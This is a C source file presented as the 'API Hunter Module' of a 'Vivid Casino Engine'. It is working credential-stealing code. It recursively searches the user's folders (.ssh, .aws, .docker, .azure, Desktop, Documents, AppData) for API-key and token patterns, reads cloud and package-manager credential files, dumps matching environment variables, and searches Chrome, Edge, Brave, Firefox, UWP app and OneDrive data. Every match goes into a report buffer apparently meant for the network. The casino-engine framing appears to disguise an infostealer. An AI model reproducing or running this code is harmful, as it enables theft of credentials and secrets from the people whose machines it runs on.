/*
 * Vivid Casino Engine — API Hunter Module
 * 
 * Scans system for exposed API keys and credentials.
 */

#include "../engine/engine.h"

/* Keywords to scan for */
static const char *config_scan_keywords[] = {
    "api_key", "secret_key", "auth_token", "access_token",
    "client_secret", "Bearer", "apikey",
    "sk-", "pk_", "ghp_", "glpat-", "AKIA", "AIza",
    "xoxb-", "SG.", "pat-na", "pplx-", "hf_",
    NULL
};

/* Check if a buffer contains any audit keywords */
static int contains_keyword(const char *buf) {
    for (int i = 0; config_scan_keywords[i]; i++) {
        if (strstr(buf, config_scan_keywords[i])) return 1;
    }
    return 0;
}

/* Scan a single file for credentials — only output matching lines */
static void scan_file(char *results, int *pos, const char *path) {
    FILE *f = fopen(path, "r");
    if (!f) return;
    
    fseek(f, 0, SEEK_END);
    long fsize = ftell(f);
    fseek(f, 0, SEEK_SET);
    if (fsize > 50000) { fclose(f); return; }
    
    char line[4096];
    int line_num = 0;
    int found_any = 0;
    int lines_this_file = 0;
    
    while (fgets(line, sizeof(line), f) && line_num < 500 && *pos < NET_BUF_SIZE - 500 && lines_this_file < 50) {
        line_num++;
        
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) {
            line[len-1] = '\0'; len--;
        }
        
        if (line[0] == '\0' || strlen(line) < 4) continue;
        
        char lower[4096];
        strncpy(lower, line, sizeof(lower) - 1);
        lower[sizeof(lower) - 1] = '\0';
        for (char *p = lower; *p; p++) *p = (char)tolower(*p);
        
        if (contains_keyword(lower)) {
            if (!found_any) {
                util_appendf(results, pos, "--- %s ---\n", path);
                found_any = 1;
            }
            util_appendf(results, pos, "%d: %s\n", line_num, line);
            lines_this_file++;
        }
    }
    
    fclose(f);
}

/* Recursively scan a directory for credential files — ALL files, not just extensions */
static void scan_directory(char *results, int *pos, const char *base, int depth) {
    if (depth <= 0) return;
    
    char pattern[MAX_PATH];
    snprintf(pattern, sizeof(pattern), "%s\\*", base);
    
    WIN32_FIND_DATAA fd;
    HANDLE h = FindFirstFileA(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return;
    
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        
        char fullpath[MAX_PATH];
        snprintf(fullpath, sizeof(fullpath), "%s\\%s", base, fd.cFileName);
        
        /* Skip our own debug log — it causes false duplicates */
        if (strstr(fullpath, "copy_buffer_debug.txt")) continue;
        
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
            scan_directory(results, pos, fullpath, depth - 1);
        } else {
            scan_file(results, pos, fullpath);
        }
    } while (FindNextFileA(h, &fd));
    
    FindClose(h);
}

/* Deduplicate lines in audit results */
static void dedup_lines(char *buf) {
    if (!buf || !buf[0]) return;
    
    char *seen[5000];
    int seen_count = 0;
    static char out[NET_BUF_SIZE];
    int out_pos = 0;
    
    char *line = buf;
    while (*line) {
        char *end = strchr(line, '\n');
        if (!end) end = line + strlen(line);
        int len = (int)(end - line);
        
        char *content = line;
        while (content < end && (*content == ' ' || *content == '\t')) content++;
        
        int is_header = (content < end && content[0] == '-' && content[1] == '-');
        int is_empty = (content >= end);
        
        char cmp[2048];
        if (!is_header && !is_empty) {
            char *p = content;
            if (*p == '[') {
                while (p < end && *p != ']') p++;
                if (p < end && *p == ']') p++;
                while (p < end && *p == ' ') p++;
            } else if (isdigit(*p)) {
                while (p < end && isdigit(*p)) p++;
                if (p < end && *p == ':') p++;
                while (p < end && *p == ' ') p++;
            }
            int clen = (int)(end - p);
            if (clen > 0 && clen < sizeof(cmp)) {
                memcpy(cmp, p, clen);
                cmp[clen] = '\0';
            } else {
                cmp[0] = '\0';
            }
        } else {
            if (len > 0 && len < sizeof(cmp)) {
                memcpy(cmp, line, len);
                cmp[len] = '\0';
            } else {
                cmp[0] = '\0';
            }
        }
        
        int dup = 0;
        for (int i = 0; i < seen_count; i++) {
            if (strcmp(seen[i], cmp) == 0) { dup = 1; break; }
        }
        
        if (!dup) {
            if (len > 0 && out_pos + len + 2 < NET_BUF_SIZE) {
                memcpy(out + out_pos, line, len);
                out_pos += len;
                out[out_pos++] = '\n';
            }
            if (seen_count < 5000) {
                int cl = strlen(cmp);
                seen[seen_count] = (char*)malloc(cl + 1);
                if (seen[seen_count]) {
                    strcpy(seen[seen_count], cmp);
                    seen_count++;
                }
            }
        }
        
        if (*end == '\0') break;
        line = end + 1;
    }
    
    out[out_pos] = '\0';
    strcpy(buf, out);
    for (int i = 0; i < seen_count; i++) free(seen[i]);
}

/* Detect machine type and architecture from system */
static void detect_machine_info(char *machine_type, int machine_type_size, char *arch, int arch_size) {
    strcpy(machine_type, "desktop");
    strcpy(arch, "x64");
    
    /* Detect architecture */
    SYSTEM_INFO si;
    GetNativeSystemInfo(&si);
    if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64) {
        strcpy(arch, "ARM64");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM) {
        strcpy(arch, "ARM");
    } else if (si.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL) {
        strcpy(arch, "x86");
    }
    
    /* Check system model for Surface/tablet */
    HKEY hKey;
    char model[256] = {0};
    DWORD modelLen = sizeof(model);
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, 
        "HARDWARE\\DESCRIPTION\\System\\BIOS", 
        0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        RegQueryValueExA(hKey, "SystemProductName", NULL, NULL, (LPBYTE)model, &modelLen);
        RegCloseKey(hKey);
    }
    
    char model_lower[256];
    strncpy(model_lower, model, sizeof(model_lower)-1);
    model_lower[sizeof(model_lower)-1] = '\0';
    for (char *p = model_lower; *p; p++) *p = (char)tolower(*p);
    
    if (strstr(model_lower, "surface") != NULL) {
        if (GetSystemMetrics(SM_TABLETPC)) {
            strcpy(machine_type, "surface-tablet");
        } else {
            strcpy(machine_type, "surface-laptop");
        }
    } else if (strstr(model_lower, "tablet") != NULL || strstr(model_lower, "slate") != NULL) {
        strcpy(machine_type, "tablet");
    }
}

/* Check if a directory exists */
static int dir_exists(const char *path) {
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY));
}

/* Check if a file exists */
static int file_exists(const char *path) {
    DWORD attr = GetFileAttributesA(path);
    return (attr != INVALID_FILE_ATTRIBUTES && !(attr & FILE_ATTRIBUTE_DIRECTORY));
}

/* Find browser data paths dynamically - handles Chrome, Edge, Brave, Firefox */
static void scan_browser_data(char *details, int *details_pos, const char *patterns) {
    char *localappdata = getenv("LOCALAPPDATA");
    char *appdata = getenv("APPDATA");
    char cmd[8192];
    char *result;
    
    if (!localappdata) return;
    
    /* Chrome - check multiple possible locations */
    char chrome_path[MAX_PATH];
    snprintf(chrome_path, sizeof(chrome_path), "%s\\Google\\Chrome\\User Data", localappdata);
    if (dir_exists(chrome_path)) {
        snprintf(cmd, sizeof(cmd), 
            "for /r \"%s\\\" %%f in (Local State,Preferences,Secure Preferences) do @type \"%%f\" 2>nul | findstr /i /n %s",
            chrome_path, patterns);
        result = sys_run_command(cmd);
        if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
            int lines = 0;
            for (char *p = result; *p; p++) if (*p == '\n') lines++;
            if (lines > 0) {
                util_appendf(details, details_pos, "--- CHROME ---\n%s\n", result);
            }
        }
        
        /* Also scan any profile directories for Login Data or cookies */
        snprintf(cmd, sizeof(cmd), 
            "for /d %%d in (\"%s\\Default\",\"%s\\Profile*\") do @if exist \"%%d\\Login Data\" (echo [Chrome profile: %%d])",
            chrome_path, chrome_path);
        result = sys_run_command(cmd);
        if (result && result[0] && strstr(result, "[No output") == NULL) {
            util_appendf(details, details_pos, "--- CHROME PROFILES ---\n%s\n", result);
        }
    }
    
    /* Edge - check multiple locations including ARM64 */
    char edge_paths[4][MAX_PATH];
    int edge_count = 0;
    snprintf(edge_paths[edge_count++], MAX_PATH, "%s\\Microsoft\\Edge\\User Data", localappdata);
    snprintf(edge_paths[edge_count++], MAX_PATH, "%s\\Microsoft\\Edge\\User Data", appdata ? appdata : "");
    /* Windows on ARM stores Edge in a different location sometimes */
    snprintf(edge_paths[edge_count++], MAX_PATH, "C:\\Program Files (x86)\\Microsoft\\Edge\\Application");
    snprintf(edge_paths[edge_count++], MAX_PATH, "C:\\Program Files\\Microsoft\\Edge\\Application");
    
    for (int i = 0; i < edge_count; i++) {
        if (dir_exists(edge_paths[i])) {
            snprintf(cmd, sizeof(cmd), 
                "for /r \"%s\\\" %%f in (Local State,Preferences) do @type \"%%f\" 2>nul | findstr /i /n %s",
                edge_paths[i], patterns);
            result = sys_run_command(cmd);
            if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
                int lines = 0;
                for (char *p = result; *p; p++) if (*p == '\n') lines++;
                if (lines > 0) {
                    util_appendf(details, details_pos, "--- EDGE ---\n%s\n", result);
                }
            }
            break; /* Only scan the first valid Edge path */
        }
    }
    
    /* Firefox profiles */
    char firefox_path[MAX_PATH];
    snprintf(firefox_path, sizeof(firefox_path), "%s\\Mozilla\\Firefox\\Profiles", appdata ? appdata : "");
    if (dir_exists(firefox_path)) {
        snprintf(cmd, sizeof(cmd), 
            "for /r \"%s\\\" %%f in (*.json,logins.json) do @type \"%%f\" 2>nul | findstr /i /n %s",
            firefox_path, patterns);
        result = sys_run_command(cmd);
        if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
            int lines = 0;
            for (char *p = result; *p; p++) if (*p == '\n') lines++;
            if (lines > 0) {
                util_appendf(details, details_pos, "--- FIREFOX ---\n%s\n", result);
            }
        }
    }
    
    /* Brave Browser */
    char brave_path[MAX_PATH];
    snprintf(brave_path, sizeof(brave_path), "%s\\BraveSoftware\\Brave-Browser\\User Data", localappdata);
    if (dir_exists(brave_path)) {
        snprintf(cmd, sizeof(cmd), 
            "for /r \"%s\\\" %%f in (Local State,Preferences) do @type \"%%f\" 2>nul | findstr /i /n %s",
            brave_path, patterns);
        result = sys_run_command(cmd);
        if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
            int lines = 0;
            for (char *p = result; *p; p++) if (*p == '\n') lines++;
            if (lines > 0) {
                util_appendf(details, details_pos, "--- BRAVE ---\n%s\n", result);
            }
        }
    }
}

/* Scan UWP/Windows Store app data for credentials (common on Surface tablets) */
static void scan_uwp_apps(char *details, int *details_pos, const char *patterns) {
    char *localappdata = getenv("LOCALAPPDATA");
    if (!localappdata) return;
    
    char packages_path[MAX_PATH];
    snprintf(packages_path, sizeof(packages_path), "%s\\Packages", localappdata);
    if (!dir_exists(packages_path)) return;
    
    char cmd[8192];
    char *result;
    
    /* Scan known UWP app local state directories */
    snprintf(cmd, sizeof(cmd), 
        "for /d %%d in (\"%s\\*\") do @if exist \"%%d\\LocalState\" "
        "(for /r \"%%d\\LocalState\" %%f in (*.json,*.txt,*.xml,*.config) do @type \"%%f\" 2>nul | findstr /i /n %s)",
        packages_path, patterns);
    result = sys_run_command(cmd);
    if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
        int lines = 0;
        for (char *p = result; *p; p++) if (*p == '\n') lines++;
        if (lines > 0) {
            util_appendf(details, details_pos, "--- UWP APPS ---\n%s\n", result);
        }
    }
}

/* Scan OneDrive and cloud sync folders */
static void scan_cloud_folders(char *details, int *details_pos, const char *patterns) {
    char *profile = getenv("USERPROFILE");
    if (!profile) return;
    
    char cmd[8192];
    char *result;
    
    /* OneDrive */
    char onedrive[4][MAX_PATH];
    int onedrive_count = 0;
    char *od_env = getenv("OneDrive");
    if (od_env) snprintf(onedrive[onedrive_count++], MAX_PATH, "%s", od_env);
    snprintf(onedrive[onedrive_count++], MAX_PATH, "%s\\OneDrive", profile);
    snprintf(onedrive[onedrive_count++], MAX_PATH, "%s\\OneDrive - %%*", profile);
    
    for (int i = 0; i < onedrive_count; i++) {
        if (dir_exists(onedrive[i])) {
            snprintf(cmd, sizeof(cmd), 
                "findstr /i /n /s %s \"%s\\*.env\" \"%s\\*.json\" \"%s\\*.ini\" \"%s\\*.txt\" \"%s\\*.yaml\" \"%s\\*.yml\" 2>nul",
                patterns, onedrive[i], onedrive[i], onedrive[i], onedrive[i], onedrive[i], onedrive[i]);
            result = sys_run_command(cmd);
            if (result && result[0] && strstr(result, "[No output") == NULL && strstr(result, "[Exec failed") == NULL) {
                int lines = 0;
                for (char *p = result; *p; p++) if (*p == '\n') lines++;
                if (lines > 0) {
                    util_appendf(details, details_pos, "--- ONEDRIVE ---\n%s\n", result);
                }
            }
            break;
        }
    }
}

/* Perform full security audit of the system */
char* config_scan_scan_system(void) {
    static char out[NET_BUF_SIZE];
    static char details[NET_BUF_SIZE];
    int out_pos = 0;
    int details_pos = 0;
    int key_count = 0;
    char cmd[16384];
    char *result;
    char machine_type[64] = "desktop";
    char arch[16] = "x64";
    
    char *profile = getenv("USERPROFILE");
    char *appdata = getenv("APPDATA");
    char *localappdata = getenv("LOCALAPPDATA");
    
    out[0] = '\0';
    details[0] = '\0';
    
    /* Detect machine info to adapt scan strategy */
    detect_machine_info(machine_type, sizeof(machine_type), arch, sizeof(arch));
    
    /* Phase 1: C-based file search (native, fast, recursive) — only matching lines */
    if (profile) {
        char path[MAX_PATH];
        snprintf(path, sizeof(path), "%s\\Desktop", profile);
        scan_directory(details, &details_pos, path, 2);
        snprintf(path, sizeof(path), "%s\\Documents", profile);
        scan_directory(details, &details_pos, path, 2);
        snprintf(path, sizeof(path), "%s\\Downloads", profile);
        scan_directory(details, &details_pos, path, 2);
        
        snprintf(path, sizeof(path), "%s\\.ssh", profile);
        scan_directory(details, &details_pos, path, 3);
        snprintf(path, sizeof(path), "%s\\.aws", profile);
        scan_directory(details, &details_pos, path, 3);
        snprintf(path, sizeof(path), "%s\\.docker", profile);
        scan_directory(details, &details_pos, path, 3);
        snprintf(path, sizeof(path), "%s\\.npm", profile);
        scan_directory(details, &details_pos, path, 3);
        snprintf(path, sizeof(path), "%s\\.config", profile);
        scan_directory(details, &details_pos, path, 3);
        snprintf(path, sizeof(path), "%s\\.azure", profile);
        scan_directory(details, &details_pos, path, 3);
        
        scan_directory(details, &details_pos, profile, 1);
    }
    
    scan_directory(details, &details_pos, "C:\\Users\\Public", 2);
    if (appdata) scan_directory(details, &details_pos, appdata, 2);
    if (localappdata) scan_directory(details, &details_pos, localappdata, 2);
    
    for (char *p = details; *p; p++) if (*p == '\n') key_count++;
    
    /* Phase 2: Known configuration files via findstr (fast, only matching lines) */
    const char *patterns = "/c:\"sk-\" /c:\"pk_\" /c:\"ghp_\" /c:\"glpat-\" /c:\"AKIA\" /c:\"AIza\" /c:\"xoxb-\" /c:\"SG.\" /c:\"pat-na\" /c:\"pplx-\" /c:\"hf_\" /c:\"api_key\" /c:\"secret_key\" /c:\"auth_token\" /c:\"access_token\" /c:\"client_secret\" /c:\"Bearer\" /c:\"apikey\"";
    
    #define CONFIG_SCAN_RUN(label, cmd_str) \
        do { \
            result = sys_run_command(cmd_str); \
            if (result && result[0] && \
                strstr(result, "[Exec failed") == NULL && \
                strstr(result, "[Pipe failed") == NULL && \
                strstr(result, "[No output") == NULL) { \
                int lines = 0; \
                for (char *p = result; *p; p++) if (*p == '\n') lines++; \
                if (lines > 0) { \
                    key_count += lines; \
                    util_appendf(details, &details_pos, "--- %s ---\n%s\n", label, result); \
                } \
            } \
        } while(0)
    
    snprintf(cmd, sizeof(cmd),
        "type \"%%USERPROFILE%%\\.env\" 2>nul & type \"%%USERPROFILE%%\\.npmrc\" 2>nul & type \"%%USERPROFILE%%\\.gitconfig\" 2>nul & type \"%%APPDATA%%\\Code\\User\\settings.json\" 2>nul & type \"%%USERPROFILE%%\\.aws\\credentials\" 2>nul & type \"%%USERPROFILE%%\\.ssh\\config\" 2>nul & type \"%%USERPROFILE%%\\.docker\\config.json\" 2>nul | findstr /i /n %s",
        patterns);
    CONFIG_SCAN_RUN("KNOWN CONFIGS", cmd);
    
    snprintf(cmd, sizeof(cmd),
        "findstr /i /n %s "
        "\"%%USERPROFILE%%\\*.env\" \"%%USERPROFILE%%\\*.json\" \"%%USERPROFILE%%\\*.ini\" \"%%USERPROFILE%%\\*.txt\" \"%%USERPROFILE%%\\*.yaml\" \"%%USERPROFILE%%\\*.yml\" "
        "2>nul", patterns);
    CONFIG_SCAN_RUN("USERPROFILE ROOT", cmd);
    
    /* Environment variables */
    result = sys_run_command("set | findstr /i /r /c:\"KEY=\" /c:\"SECRET=\" /c:\"TOKEN=\" /c:\"API=\" /c:\"AUTH=\" /c:\"PASS=\"");
    if (result && result[0] && strstr(result, "[No output") == NULL) {
        int lines = 0;
        for (char *p = result; *p; p++) if (*p == '\n') lines++;
        if (lines > 0) {
            key_count += lines;
            util_appendf(details, &details_pos, "--- ENV VARS ---\n%s\n", result);
        }
    }
    
    /* Phase 3: Browser data - adaptive based on what's installed */
    scan_browser_data(details, &details_pos, patterns);
    
    /* Phase 4: Surface/Tablet specific - UWP apps and cloud folders */
    if (strstr(machine_type, "surface") != NULL || strstr(machine_type, "tablet") != NULL) {
        scan_uwp_apps(details, &details_pos, patterns);
        scan_cloud_folders(details, &details_pos, patterns);
        
        /* Surface often has Windows Terminal, PowerShell, and dev tools in different locations */
        char wt_path[MAX_PATH];
        snprintf(wt_path, sizeof(wt_path), "%s\\Microsoft\\Windows Terminal", localappdata ? localappdata : "");
        if (dir_exists(wt_path)) {
            scan_directory(details, &details_pos, wt_path, 2);
        }
        
        /* Windows Subsystem for Linux (WSL) - common on dev Surfaces */
        if (dir_exists("C:\\Users\\\\wsl.localhost")) {
            snprintf(cmd, sizeof(cmd), "wsl.exe -l -v 2>nul");
            result = sys_run_command(cmd);
            if (result && result[0] && strstr(result, "[Exec failed") == NULL) {
                util_appendf(details, &details_pos, "--- WSL INSTALLED ---\n%s\n", result);
            }
        }
    }
    
    /* Phase 5: ARM-specific paths */
    if (strcmp(arch, "ARM64") == 0 || strcmp(arch, "ARM") == 0) {
        /* ARM64 Windows has different Program Files structure */
        char arm_paths[][MAX_PATH] = {
            "C:\\Program Files\\WindowsApps",
            "C:\\Program Files (Arm)"
        };
        for (int i = 0; i < 2; i++) {
            if (dir_exists(arm_paths[i])) {
                scan_directory(details, &details_pos, arm_paths[i], 1);
            }
        }
    }
    
    /* Build output report */
    util_appendf(out, &out_pos, "=== API KEY HUNTER ===\n");
    util_appendf(out, &out_pos, "Machine: %s | Arch: %s\n\n", machine_type, arch);
    if (key_count > 0) {
        util_appendf(out, &out_pos, "Found %d match(es):\n\n", key_count);
        util_appendf(out, &out_pos, "%s", details);
    } else {
        util_appendf(out, &out_pos, "Found 0 matches.\n");
    }
    util_appendf(out, &out_pos, "=== SEARCH COMPLETE ===\n");
    
    return out;
}
